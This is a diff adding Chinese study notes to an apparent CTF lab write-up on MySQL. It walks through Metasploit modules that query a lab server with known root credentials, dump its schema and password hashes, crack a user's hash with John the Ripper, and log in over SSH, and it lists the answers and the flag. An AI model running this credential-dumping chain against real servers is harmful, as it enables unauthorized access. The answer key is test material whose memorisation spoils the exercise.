@@ -654,6 +654,297 @@ Question 2：登入 ssh 列出檔案，讀取 stmp.txt，獲得 Flag 🎉🎉
 
 >> #### Task 8：瞭解 MySQL
 
->> #### Task 9：利用 MySQL 
+- **MySQL** 是什麼？
+  - MySQL 是一套 **關聯式資料庫管理系統（RDBMS）**
+  - 使用 **SQL（結構化查詢語言）** 來存取和管理資料
+  
 
->> #### Task 10：結論
+- **重要概念拆解**：
+  - **資料庫（Database）**：有組織的、持久儲存的結構化資料集合。
+  - **RDBMS（關聯式資料庫管理系統）**：透過「表格」來儲存資料，表與表之間透過「主鍵（Primary Key）」等方式建立關聯。
+  - **SQL（Structured Query Language）**：一種專門用來操作資料庫的語言。
+
+<details>
+<summary><strong>運作方式：</strong></summary>
+
+1. **建立資料庫與資料表**：定義資料的儲存結構與關聯
+2. **用戶端發送 SQL 指令**：如查詢、新增、更新或刪除資料
+3. **伺服器處理指令**：回傳結果給用戶端
+
+---
+
+執行平台：
+- 支援 **Linux、Windows** 等作業系統
+- 是 **LAMP 架構** 的核心組件之一（Linux + Apache + MySQL + PHP）
+
+
+</details>
+
+##### 🔐 答題：
+1. What type of software is MySQL?
+   
+   MySQL 是什麼類型的軟體？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `Relational Database Management System`
+
+2. What language is MySQL based on?
+   
+   MySQL 基於什麼語言？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `SQL`
+
+3. What communication model does MySQL use?
+   
+   MySQL 使用什麼通信模型？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `Client-Server`
+
+4. What is a common application of MySQL?
+   
+   MySQL 的常見應用是什麼？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `Back End Database`
+
+5. What major social network uses MySQL as their back-end database? This will require further research.
+   
+   哪個主要社交網路使用 MySQL 作為他們的後端資料庫？這需要進一步的研究。
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `Facebook`
+
+
+>> #### Task 9：枚舉 MySQL 
+
+- 基本觀念：
+    - MySQL 通常**不是初步入侵的起點**，但若已取得帳密，則可成為橫向移動的入口。
+    - 在 CTF 題目中，MySQL 通常是經過前期 **子域名掃描、憑證蒐集** 等才會拿到帳密。
+
+- 攻擊情境設定：
+  - 你已從某個網站子域名蒐集到帳密。使用者：root，密碼：password
+  - 你試著用 SSH 登入失敗，改試對 MySQL 登入。
+
+🔍 **枚舉 MySQL 資訊**
+- 工具： MySQL Client、Metasploit 模組
+
+Question 1：透過`nmap`掃描，找出 `mysql` 的 Port：3306
+
+<p align="left">
+  <img src="/rooms/images/12_23.png" width="600">
+</p>
+
+Question 2 - 4：啟動 `msfconle`，搜尋 `mysql_sql`，設置參數（已知條件：用戶和密碼是root/password）後執行
+
+```
+msfconsole
+search mysql_sql
+use 0 
+options
+set PASSWORD password
+set RHOSTS <IP>
+set USERNAME root
+run
+```
+
+<p align="left">
+  <img src="/rooms/images/12_24.png" width="600">
+</p>
+
+<p align="left">
+  <img src="/rooms/images/12_25.png" width="600">
+</p>
+
+<p align="left">
+  <img src="/rooms/images/12_26.png" width="600">
+</p>
+
+<p align="left">
+  <img src="/rooms/images/12_27.png" width="600">
+</p>
+
+- 查詢語句 select version() 的返回結果為：5.7.29-0ubuntu0.18.04.1
+
+Question 5：修改`mysql_sql`模塊的默認參數，查看目標 MySQL 服務器中有多少個數據庫（show databases）
+
+```
+options
+set SQL show databases
+run
+```
+
+<p align="left">
+  <img src="/rooms/images/12_28.png" width="600">
+</p>
+
+<p align="left">
+  <img src="/rooms/images/12_29.png" width="600">
+</p>
+
+- 目標 MySQL 服務器中共有 4 個數據庫
+
+##### 🔐 答題：
+1. As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?
+   
+   與往常一樣，讓我們從埠掃描開始，這樣我們就知道我們試圖攻擊的服務正在哪個埠上運行。MySQL 使用什麼埠？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `3306`
+
+2. Search for, select and list the options it needs. What three options do we need to set? (in descending order).
+   
+   搜索、選擇並列出它需要的選項。我們需要設置哪三個選項？（按降序排列）。
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `PASSWORD/RHOSTS/USERNAME`
+
+3. Run the exploit. By default it will test with the "select version()" command, what result does this give you?
+   
+   運行漏洞利用。默認情況下，它將使用 「select version（）」 命令進行測試，這會給您帶來什麼結果？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `5.7.29-0ubuntu0.18.04.1`
+
+4. Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the "sql" option to "show databases". how many databases are returned?
+   
+   偉大！我們知道我們的漏洞利用正在按計劃進行。讓我們嘗試獲得一些更雄心勃勃的資訊。將 「sql」 選項更改為 「show databases」。。返回多少個資料庫？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `4`
+
+>> #### Task 10：利用 MySQL 
+
+**🧠 關鍵名詞說明：**：
+- 📌 **Schema（架構 / 資料庫）**
+  - 在 **MySQL 中 Schema ≈ Database**
+  - 你可以用 `CREATE SCHEMA` 或 `CREATE DATABASE`，兩者效果一樣
+  
+
+- 📌 **Hashes（雜湊）**
+  - 雜湊是 **固定長度的輸出**，由 **加密演算法** 將輸入資料轉換而來
+  - 在 MySQL 中雜湊可用於：
+    - **建立資料索引**（hash index，加速查詢）
+    - **儲存密碼（非明文）**，例如 `mysql.user` 表內的 `authentication_string`
+
+Question 1、2：搜尋 `mysql_schemadump`，設置參數後執行
+
+```
+search mysql_schemadump
+use 0
+options
+set RHOSTS <IP>
+set PASSWORD password
+set USERNAME root
+run
+```
+
+<p align="left">
+  <img src="/rooms/images/12_30.png" width="600">
+</p>
+
+<p align="left">
+  <img src="/rooms/images/12_31.png" width="600">
+</p>
+
+<p align="left">
+  <img src="/rooms/images/12_32.png" width="600">
+</p>
+
+<p align="left">
+  <img src="/rooms/images/12_33.png" width="600">
+</p>
+
+- 模組全名為：`auxiliary/scanner/mysql/mysql_schemadump`
+- 最後一個表格名為：x$waits_global_by_latency
+
+Question 3、4：搜尋 `mysql_hashdump`，設置參數後執行
+
+```
+search mysql_hashdump
+use 0
+options
+set PASSWORD password
+set RHOSTS <IP>
+set USERNAME root
+run
+```
+
+<p align="left">
+  <img src="/rooms/images/12_34.png" width="600">
+</p>
+
+
+<p align="left">
+  <img src="/rooms/images/12_35.png" width="600">
+</p>
+
+<p align="left">
+  <img src="/rooms/images/12_36.png" width="600">
+</p>
+
+- 模組全名為：`auxiliary/scanner/mysql/mysql_hashdump`
+- 找到一名非預設的使用者：carl
+- 用戶及其密碼hash值的完整字符串：<br>carl:*EA031893AA21444B170FC2162A56978B8CEECE18
+
+Question 5：退出 msf 後，將上圖中的最後一條記錄保存到本地機新建的hash.txt文件中：<br>
+
+`echo carl:*EA031893AA21444B170FC2162A56978B8CEECE18 > hash.txt`<br>
+`john hash.txt`
+
+<p align="left">
+  <img src="/rooms/images/12_37.png" width="600">
+</p>
+
+<p align="left">
+  <img src="/rooms/images/12_38.png" width="600">
+</p>
+
+- 破解hash得到的密碼為：doggie
+
+Question 6：使用 hash 破解的密碼，通過 SSH 登入目標機，查看目標文件的內容，獲得 Flag 🎉🎉
+
+```
+ssh carl@<IP>  #輸入密碼：doggie
+ls
+cat MySQL.txt
+```
+
+<p align="left">
+  <img src="/rooms/images/12_40.png" width="600">
+</p>
+
+##### 🔐 答題：
+1. First, let's search for and select the "mysql_schemadump" module. What's the module's full name?
+   
+   首先，讓我們搜索並選擇 「mysql_schemadump」 模組。模組的全名是什麼？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `auxiliary/scanner/mysql/mysql_schemadump`
+
+2. Great! Now, you've done this a few times by now so I'll let you take it from here. Set the relevant options, run the exploit. What's the name of the last table that gets dumped?
+   
+   太好了！現在，您已經這樣做了幾次，所以我讓您從這裡開始。設置相關選項，運行漏洞利用。最後一個被轉儲的表的名稱是什麼？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `x$waits_global_by_latency`
+
+3. Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better... search for and select the "mysql_hashdump" module. What's the module's full name?
+   
+   太棒了，您現在已經轉儲了整個資料庫的表和列名。但我們可以做得更好...搜索並選擇 「mysql_hashdump」 模組。模組的全名是什麼？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `auxiliary/scanner/mysql/mysql_hashdump`
+
+4. Again, I'll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?
+
+   同樣，我讓你從這裡開始。設置相關選項，運行漏洞利用。哪個非預設使用者對您印象深刻？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `carl`
+
+5. What is the user/hash combination string?
+
+   什麼是 user/hash 組合字串？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `carl:*EA031893AA21444B170FC2162A56978B8CEECE18`
+
+6. Now, we need to crack the password! Let's try John the Ripper against it using: "john hash.txt" what is the password of the user we found?
+
+   現在，我們需要破解密碼！讓我們嘗試使用 John the Ripper 來對抗它：「john hash.txt」我們找到的使用者的密碼是什麼？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `doggie`
+
+7. What's the contents of MySQL.txt
+
+   MySQL.txt 的內容是什麼？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `THM{congratulations_you_got_the_mySQL_flag}`
